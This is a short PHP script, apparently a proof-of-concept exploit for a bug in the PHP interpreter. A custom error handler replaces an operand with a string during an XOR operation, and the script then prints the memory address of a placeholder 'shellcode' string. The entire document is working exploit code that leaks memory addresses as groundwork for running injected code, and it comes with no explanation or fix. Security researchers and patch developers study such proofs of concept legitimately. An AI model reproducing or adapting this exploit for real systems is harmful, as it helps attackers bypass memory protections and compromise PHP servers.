<?php

/* This will leak the Address of the string "I AM THE SHELLCODE. SERIOUSLY..." in memory */

error_reporting(E_ALL);

/* Initialize */
$a = 1;
$b = new stdClass();

/* Setup Error Handler */
set_error_handler("my_error");
   
/* Trigger the Code */
$addr = $a ^ $b;
$addr ^= 1;

restore_error_handler();

echo sprintf("%016x\n", $addr);
sleep(1);

function my_error()
{
    $GLOBALS['a'] = "I AM THE SHELLCODE. SERIOUSLY...";
    return 1;
}
?>
